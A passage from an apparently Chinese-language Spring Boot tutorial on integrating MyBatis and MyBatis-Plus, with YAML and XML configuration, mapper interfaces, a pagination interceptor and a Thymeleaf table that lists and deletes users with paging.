class="hljs-string">com.mysql.jdbc.Driver</span><br><br><span class="hljs-comment"># 配置mybatis规则</span><br><span class="hljs-attr">mybatis:</span><br>  <span class="hljs-attr">config-location:</span> <span class="hljs-string">classpath:mybatis/mybatis-config.xml</span>  <span class="hljs-comment">#全局配置文件位置</span><br>  <span class="hljs-attr">mapper-locations:</span> <span class="hljs-string">classpath:mybatis/*.xml</span>  <span class="hljs-comment">#sql映射文件位置</span><br></code></pre></td></tr></table></figure><p><strong>mybatis-config.xml</strong>:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">configuration</span></span><br><span class="hljs-meta">  <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span><br><span class="hljs-meta">  <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 由于Spring Boot自动配置缘故，此处不必配置，只用来做做样。--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>Mapper接口</strong>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span></span><br><span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.lun.boot.mapper.UserMapper&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getUser&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.lun.boot.bean.User&quot;</span>&gt;</span><br>        select * from user where id=#&#123;id&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.lun.boot.bean.User;<br><span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Mapper;<br><br><span class="hljs-meta">@Mapper</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> &#123;<br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(Integer id)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>POJO</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> Integer id;<br>    <span class="hljs-keyword">private</span> String name;<br>    <br><span class="hljs-comment">//getters and setters...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>DB</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `<span class="hljs-keyword">user</span>` (<br>  `id` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,<br>  `name` <span class="hljs-type">varchar</span>(<span class="hljs-number">45</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  <span class="hljs-keyword">PRIMARY</span> KEY (`id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB AUTO_INCREMENT<span class="hljs-operator">=</span><span class="hljs-number">3</span> <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4;<br></code></pre></td></tr></table></figure><p><strong>Controller and Service</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> UserService userService;<br><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@GetMapping(&quot;/user/&#123;id&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Integer id)</span>&#123;<br><br>        <span class="hljs-keyword">return</span> userService.getUser(id);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> UserMapper userMapper;<span class="hljs-comment">//IDEA下标红线，可忽视这红线</span><br><br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(Integer id)</span>&#123;<br>        <span class="hljs-keyword">return</span> userMapper.getUser(id);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>配置<code>private Configuration configuration;</code> 也就是配置<code>mybatis.configuration</code>相关的，就是相当于改mybatis全局配置文件中的值。（也就是说配置了<code>mybatis.configuration</code>，就不需配置mybatis全局配置文件了）</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 配置mybatis规则</span><br><span class="hljs-attr">mybatis:</span><br>  <span class="hljs-attr">mapper-locations:</span> <span class="hljs-string">classpath:mybatis/mapper/*.xml</span><br>  <span class="hljs-comment"># 可以不写全局配置文件，所有全局配置文件的配置都放在configuration配置项中了。</span><br>  <span class="hljs-comment"># config-location: classpath:mybatis/mybatis-config.xml</span><br>  <span class="hljs-attr">configuration:</span><br>    <span class="hljs-attr">map-underscore-to-camel-case:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><ul><li>导入MyBatis官方Starter。</li><li>编写Mapper接口，需<code>@Mapper</code>注解。</li><li>编写SQL映射文件并绑定Mapper接口。</li><li>在<code>application.yaml</code>中指定Mapper配置文件的所处位置，以及指定全局配置文件的信息 （建议：**配置在<code>mybatis.configuration</code>**）。</li></ul><h2 id="64、数据访问-整合MyBatis-注解配置混合版"><a href="#64、数据访问-整合MyBatis-注解配置混合版" class="headerlink" title="64、数据访问-整合MyBatis-注解配置混合版"></a>64、数据访问-整合MyBatis-注解配置混合版</h2><p>你可以通过Spring Initializr添加MyBatis的Starer。</p><p><strong>注解与配置混合搭配，干活不累</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapper</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> &#123;<br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(Integer id)</span>;<br><br>    <span class="hljs-meta">@Select(&quot;select * from user where id=#&#123;id&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser2</span><span class="hljs-params">(Integer id)</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveUser</span><span class="hljs-params">(User user)</span>;<br><br>    <span class="hljs-meta">@Insert(&quot;insert into user(`name`) values(#&#123;name&#125;)&quot;)</span><br>    <span class="hljs-meta">@Options(useGeneratedKeys = true, keyProperty = &quot;id&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveUser2</span><span class="hljs-params">(User user)</span>;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span></span><br><span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.lun.boot.mapper.UserMapper&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getUser&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.lun.boot.bean.User&quot;</span>&gt;</span><br>        select * from user where id=#&#123;id&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;saveUser&quot;</span> <span class="hljs-attr">useGeneratedKeys</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">keyProperty</span>=<span class="hljs-string">&quot;id&quot;</span>&gt;</span><br>        insert into user(`name`) values(#&#123;name&#125;)<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><p>简单DAO方法就写在注解上。复杂的就写在配置文件里。</p></li><li><p>使用<code>@MapperScan(&quot;com.lun.boot.mapper&quot;)</code> 简化，Mapper接口就可以不用标注<code>@Mapper</code>注解。</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@MapperScan(&quot;com.lun.boot.mapper&quot;)</span><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(MainApplication.class, args);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="65、数据访问-整合MyBatisPlus操作数据库"><a href="#65、数据访问-整合MyBatisPlus操作数据库" class="headerlink" title="65、数据访问-整合MyBatisPlus操作数据库"></a>65、数据访问-整合MyBatisPlus操作数据库</h2><p><a href="https://plugins.jetbrains.com/plugin/10119-mybatisx">IDEA的MyBatis的插件 - MyBatisX</a></p><p><a href="https://baomidou.com/">MyBatisPlus官网</a></p><p><a href="https://baomidou.com/guide/">MyBatisPlus官方文档</a></p><h3 id="MyBatisPlus是什么"><a href="#MyBatisPlus是什么" class="headerlink" title="MyBatisPlus是什么"></a>MyBatisPlus是什么</h3><p><a href="https://github.com/baomidou/mybatis-plus">MyBatis-Plus</a>（简称 MP）是一个 <a href="http://www.mybatis.org/mybatis-3/">MyBatis</a>的增强工具，在 MyBatis 的基础上只做增强不做改变，为简化开发、提高效率而生。</p><hr><p>添加依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><p><code>MybatisPlusAutoConfiguration</code>配置类，<code>MybatisPlusProperties</code>配置项绑定。</p></li><li><p><code>SqlSessionFactory</code>自动配置好，底层是容器中默认的数据源。</p></li><li><p><code>mapperLocations</code>自动配置好的，有默认值<code>classpath*:/mapper/**/*.xml</code>，这表示任意包的类路径下的所有mapper文件夹下任意路径下的所有xml都是sql映射文件。  建议以后sql映射文件放在 mapper下。</p></li><li><p>容器中也自动配置好了<code>SqlSessionTemplate</code>。</p></li><li><p><code>@Mapper</code> 标注的接口也会被自动扫描，建议直接 <code>@MapperScan(&quot;com.lun.boot.mapper&quot;)</code>批量扫描。</p></li><li><p>MyBatisPlus<strong>优点</strong>之一：只需要我们的Mapper继承MyBatisPlus的<code>BaseMapper</code> 就可以拥有CRUD能力，减轻开发工作。</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.mapper.BaseMapper;<br><span class="hljs-keyword">import</span> com.lun.hellomybatisplus.model.User;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseMapper</span>&lt;User&gt; &#123;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="66、数据访问-CRUD实验-数据列表展示"><a href="#66、数据访问-CRUD实验-数据列表展示" class="headerlink" title="66、数据访问-CRUD实验-数据列表展示"></a>66、数据访问-CRUD实验-数据列表展示</h2><p><a href="https://baomidou.com/guide/crud-interface.html">官方文档 - CRUD接口</a></p><p>使用MyBatis Plus提供的<code>IService</code>，<code>ServiceImpl</code>，减轻Service层开发工作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.lun.hellomybatisplus.model.User;<br><span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.service.IService;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  Service 的CRUD也不用写了</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">IService</span>&lt;User&gt; &#123;<br><span class="hljs-comment">//此处故意为空</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.lun.hellomybatisplus.model.User;<br><span class="hljs-keyword">import</span> com.lun.hellomybatisplus.mapper.UserMapper;<br><span class="hljs-keyword">import</span> com.lun.hellomybatisplus.service.UserService;<br><span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Service;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ServiceImpl</span>&lt;UserMapper,User&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br><span class="hljs-comment">//此处故意为空</span><br>&#125;<br></code></pre></td></tr></table></figure><p>与下一节联合在一起</p><h2 id="67、数据访问-CRUD实验-分页数据展示"><a href="#67、数据访问-CRUD实验-分页数据展示" class="headerlink" title="67、数据访问-CRUD实验-分页数据展示"></a>67、数据访问-CRUD实验-分页数据展示</h2><p>与下一节联合在一起</p><h2 id="68、数据访问-CRUD实验-删除用户完成"><a href="#68、数据访问-CRUD实验-删除用户完成" class="headerlink" title="68、数据访问-CRUD实验-删除用户完成"></a>68、数据访问-CRUD实验-删除用户完成</h2><p>添加分页插件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBatisConfig</span> &#123;<br><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * MybatisPlusInterceptor</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> MybatisPlusInterceptor <span class="hljs-title function_">paginationInterceptor</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">MybatisPlusInterceptor</span> <span class="hljs-variable">mybatisPlusInterceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MybatisPlusInterceptor</span>();<br>        <span class="hljs-comment">// 设置请求的页面大于最大页后操作， true调回到首页，false 继续请求  默认false</span><br>        <span class="hljs-comment">// paginationInterceptor.setOverflow(false);</span><br>        <span class="hljs-comment">// 设置最大单页限制数量，默认 500 条，-1 不受限制</span><br>        <span class="hljs-comment">// paginationInterceptor.setLimit(500);</span><br>        <span class="hljs-comment">// 开启 count 的 join 优化,只针对部分 left join</span><br><br>        <span class="hljs-comment">//这是分页拦截器</span><br>        <span class="hljs-type">PaginationInnerInterceptor</span> <span class="hljs-variable">paginationInnerInterceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PaginationInnerInterceptor</span>();<br>        paginationInnerInterceptor.setOverflow(<span class="hljs-literal">true</span>);<br>        paginationInnerInterceptor.setMaxLimit(<span class="hljs-number">500L</span>);<br>        mybatisPlusInterceptor.addInnerInterceptor(paginationInnerInterceptor);<br><br>        <span class="hljs-keyword">return</span> mybatisPlusInterceptor;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;display table table-bordered table-striped&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dynamic-table&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>#<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>name<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>age<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>email<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>操作<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;gradeX&quot;</span> <span class="hljs-attr">th:each</span>=<span class="hljs-string">&quot;user: $&#123;users.records&#125;&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;user.id&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>[[$&#123;user.name&#125;]]<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;user.age&#125;&quot;</span>&gt;</span>Win 95+<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;user.email&#125;&quot;</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/user/delete/&#123;id&#125;(id=$&#123;user.id&#125;,pn=$&#123;users.current&#125;)&#125;&quot;</span> </span><br><span class="hljs-tag">                   <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-danger btn-sm&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>删除<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tfoot</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row-fluid&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;span6&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dataTables_info&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dynamic-table_info&quot;</span>&gt;</span><br>            当前第[[$&#123;users.current&#125;]]页  总计 [[$&#123;users.pages&#125;]]页  共[[$&#123;users.total&#125;]]条记录<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;span6&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dataTables_paginate paging_bootstrap pagination&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;prev disabled&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>← 前一页<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">th:class</span>=<span class="hljs-string">&quot;$&#123;num == users.current?&#x27;active&#x27;:&#x27;&#x27;&#125;&quot;</span> </span><br><span class="hljs-tag">                    <span class="hljs-attr">th:each</span>=<span class="hljs-string">&quot;num:$&#123;#numbers.sequence(1,users.pages)&#125;&quot;</span> &gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span 